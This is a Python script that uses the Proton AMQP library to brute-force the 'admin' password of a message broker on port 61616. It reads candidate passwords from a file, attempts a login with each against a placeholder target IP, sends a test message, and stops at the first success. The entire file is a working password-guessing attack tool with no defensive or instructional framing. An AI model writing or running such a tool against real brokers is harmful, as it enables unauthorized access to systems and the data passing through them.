from __future__ import print_function
from proton import Message
from proton.handlers import MessagingHandler
from proton.reactor import Container
import sys
import time

class SendHandler(MessagingHandler):
    def __init__(self, url, address, message_body):
        super(SendHandler, self).__init__()
        self.url = url
        self.address = address
        self.message_body = message_body
        self.sent = False

    def on_start(self, event):
        conn = event.container.connect(self.url)
        if conn:
            event.container.create_sender(conn, self.address)

    def on_sendable(self, event):
        if not self.sent:
            msg = Message(body=self.message_body)
            event.sender.send(msg)
            self.sent = True
            event.sender.close()
            event.connection.close()

    def on_accepted(self, event):
        pass  # Успех — сообщение принято

    def on_disconnected(self, event):
        pass

    def on_rejected(self, event):
        pass

def try_password(login, password, target_ip, port, address, message_body):
    url = f"amqp://{login}:{password}@{target_ip}:{port}"
    try:
        container = Container(SendHandler(url, address, message_body))
        container.run()
        print(f"Success with password: {password}")
        return True
    except Exception as e:
        print(f"Failed with password: {password} - Error: {e}")
        return False


login = "admin"
target_ip = "<ip>"
port = 61616
address = "testQueue"
message_body = "test"
pass_file = "pass.txt"

try:
    with open(pass_file, 'r') as f:
        passwords = [line.strip() for line in f if line.strip()]
except FileNotFoundError:
    print(f"File {pass_file} not found.")
    sys.exit(1)


for password in passwords:
    if try_password(login, password, target_ip, port, address, message_body):
        print("Brute-force successful! Stopping.")
        break
    time.sleep(1) 

print("Brute-force completed.")
